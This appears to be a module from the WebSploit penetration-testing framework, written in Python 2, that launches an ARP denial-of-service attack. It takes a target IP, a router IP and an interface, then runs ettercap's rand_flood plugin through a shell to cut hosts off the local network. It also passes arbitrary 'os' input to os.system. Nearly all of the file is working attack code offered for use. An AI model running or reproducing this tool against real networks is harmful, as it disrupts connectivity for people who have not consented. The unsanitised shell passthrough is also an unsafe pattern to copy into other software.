#!/usr/bin/env python
#
# WebSploit Framework ARP Denial Of Service Attack module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com
import os
import subprocess
from core import wcolors
from core import help
from time import sleep

options = ["192.168.1.1", "192.168.1.3", "eth0"]
def arp_dos():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "ARP DOS" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] =='set interface':
			interface_name = com[14:25]
			options[2] = interface_name
			print "Interface => " + options[2]
			arp_dos()
		elif com[0:10] =='set target':
			target_ip = com[11:27]
			options[1] = target_ip
			print "TARGET => " + options[1]
			arp_dos()
		elif com[0:10] =='set router':
			router_ip = com[11:27]
			options[0] = router_ip
			print "ROUTER => " + options[0]
			arp_dos()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t RQ\t Description"
			print "---------\t--------------\t\t----\t--------------"
			print "Interface\t"+options[2]+"\t\t\tyes\tNetwork Interface Name"
			print "TARGET\t\t"+options[1]+"\t\tyes\tTarget IP Address"
			print "ROUTER\t\t"+options[0]+"\t\tyes\tRouter IP Address"
			print ""
			arp_dos()
		elif com[0:2] =='os':
			os.system(com[3:])
			arp_dos()
		elif com[0:4] =='help':
			help.help()
			arp_dos()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			print(wcolors.color.BOLD + wcolors.color.BLUE + "[*]Attack Has Been Started ..." + wcolors.color.ENDC)
			command = 'ettercap -i '+ options[2] + ' -Tq -P rand_flood ' + '/'+options[0]+'/' + ' ' + '/'+options[1]+'/'
			subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
			line_4 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
			line_4 += ":"
			line_4 += wcolors.color.UNDERL + wcolors.color.BLUE + "ARP DOS" + wcolors.color.ENDC
			line_4 += " > For Stop The ARP DOS Attack Press [Enter] : "
			fin = raw_input(line_4)
			os.system('killall ettercap')
			print(wcolors.color.BOLD + wcolors.color.GREEN + "[*]Attack Stoped." + wcolors.color.ENDC)
		else:
			print "Wrong Command =>" + com
			arp_dos()
	except(KeyboardInterrupt):
		print ""
